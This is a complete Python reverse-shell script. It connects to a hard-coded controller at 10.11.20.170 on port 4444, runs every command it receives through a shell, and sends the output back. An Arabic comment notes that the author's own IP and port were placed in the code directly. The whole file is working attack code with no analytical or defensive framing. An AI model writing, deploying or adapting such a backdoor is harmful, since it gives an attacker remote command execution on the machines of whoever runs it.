import socket
import subprocess

def connect_to_controller():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # تم وضع الـ IP الخاص بك والـ Port الصحيح هنا مباشرة
    client.connect(('10.11.20.170', 4444))
    
    while True:
        command = client.recv(1024).decode('utf-8')
        if command.lower() == 'exit':
            break
            
        output = subprocess.run(command, shell=True, capture_output=True, text=True)
        result = output.stdout + output.stderr
        if not result:
            result = "Command executed successfully.\n"
            
        client.send(result.encode('utf-8'))
        
    client.close()

if __name__ == "__main__":
    connect_to_controller()
